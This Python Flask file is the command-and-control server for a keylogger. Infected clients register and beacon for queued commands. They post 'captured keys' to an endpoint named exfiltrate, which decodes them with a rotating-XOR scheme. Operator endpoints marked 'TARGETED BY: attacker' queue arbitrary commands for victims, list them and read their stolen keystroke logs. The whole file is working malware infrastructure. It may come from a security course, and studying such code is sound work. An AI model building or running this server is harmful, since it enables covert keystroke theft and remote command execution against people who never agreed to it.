
from flask import Flask, request
import time


app = Flask(__name__)

# global constants
PLAIN_TEXT = {'Content-Type': 'text/plain'}
MAX_ACTIVE_TIME_BETWEEN_BEACON = 45

class Cli():
    def __init__(self, id: str, os: str, arch: str, time_s: str):
        self.id = id; 
        self.os = os
        self.arch = arch
        self.commands, self.logs = [], []
        self.last_beacon = float(time_s)  # stores as a timestamp
        self.beacon_diff = self.get_time_since_beacon()
        self.is_active = True
    
    def get_time_since_beacon(self):
        # return the difference in seconds since last beacon
        return time.time() - self.last_beacon

    def update_status(self):
        # simply update the time since last beacon, if > 60 seconds set client as inactive
        self.beacon_diff = self.get_time_since_beacon()
        self.is_active = self.beacon_diff <= MAX_ACTIVE_TIME_BETWEEN_BEACON
    
    # add a command or log
    def add_command(self, cmd): self.commands.append(cmd)
    def add_log(self, log):     self.logs.append(log)
    
    def __str__(self):
        str_ =  f'{self.id}\n'
        str_ += f'  - Last Beacon: {time.ctime(self.last_beacon)}, {int(self.beacon_diff)}s ago.\n'
        str_ += f'  - Status: {"ACTIVE" if self.is_active else "NOT ACTIVE"}\n'
        return str_


# dictionary of client_id->client_object
clients: dict[str, Cli] = {}


# TARGETED BY: client
@app.route('/register', methods=['GET'])
def register():
    id = request.args.get('id')
    os = request.args.get('os')
    arch = request.args.get('arch')
    time_s = request.args.get('time')
    client = Cli(id, os, arch, time_s)

    clients[id] = client
    return 'OK', 200, PLAIN_TEXT


# TARGETED BY: client
# the client targets their log and posts captured keys
# if the client is not registered then return early
@app.route('/logs/<cid>', methods=['POST'])
def exfiltrate(cid):
    if cid not in clients.keys():
        return 'UNKNOWN CLI', 400, PLAIN_TEXT

    log = request.get_data(as_text=False) # we want bytes not text!
    log = decode(log)  # decode the encoded logs

    clients[cid].add_log(log)
    return 'OK', 200, PLAIN_TEXT


# TARGETED BY: client
@app.route('/commands', methods=['GET'])
def get_commands():
    # Endpoint serves as both command retrieval and beacon
    # requests come in the form /commands?cid=<cid>&time=<timstamp>
    cid = request.args.get('cid')
    if cid not in clients.keys():
        return 'UNKNOWN CLI', 400, PLAIN_TEXT

    # update the beacon timestamp!
    clients[cid].last_beacon = float(request.args.get('time'))
    clients[cid].update_status()

    # if there are no commands to execute return nothing
    if len(clients[cid].commands) == 0:
        return '', 200, PLAIN_TEXT
    
    cmds = '\n'.join(clients[cid].commands)
    clients[cid].commands = []  # clear command log
    return cmds, 200, PLAIN_TEXT


# TARGETED BY: attacker
@app.route('/commands/<cid>', methods=['POST'])
def add_command(cid):
    if cid not in clients.keys():
        return f'BAD REQ: <{cid}> is not registered.', 400, PLAIN_TEXT
    
    cmd = request.get_data(as_text=True)
    clients[cid].add_command(cmd)
    return f'Successfully sent command to <{cid}>', 200, PLAIN_TEXT


# TARGETED BY: attacker
@app.route('/clients', methods=['GET'])
def get_clients():
    # ensure each clients information is up to date
    for client in clients.values():
        client.update_status()

    clis_as_strs = [str(c) for c in clients.values()]
    return '\n'.join(clis_as_strs), 200, PLAIN_TEXT


# TARGETED BY: attacker
@app.route('/logs/<cid>', methods=['GET'])
def get_log(cid):
    if cid not in clients.keys():
        return f'BAD REQ: <{cid}> is not registered.', 400, PLAIN_TEXT
    
    return '\n'.join(clients[cid].logs), 200, PLAIN_TEXT



# -------------------------
# Encoding helper functions
# -------------------------


def rotate_right(ch):
    ''' This performs the same operation as in my c code 
    but applies an 8-bit mask of 0xFF. This knowledge was
    sourced from chatgpt.com (OpenAI, 2025) 
    '''
    return ((ch >> 1) | (ch << (8 - 1))) & 0xFF

def encode(msg: str) -> str:
    ' Encode the message '
    return asym_xor(msg.encode('utf-8'))

def decode(msg: bytes) -> str:
    ' Decodes and encoded message '
    return asym_xor(msg).decode('utf-8')

def asym_xor(s: bytes):
    ' symetric encoding helper function '
    key = 0x2E
    result = bytearray()

    for byte in s:
        if byte != key and key != 0x00:
            byte ^= key   # perform xor
        result.append(byte)
        key = rotate_right(key)

    return bytes(result)


if __name__ == '__main__':
    app.run(host='127.0.0.1', threaded=True)

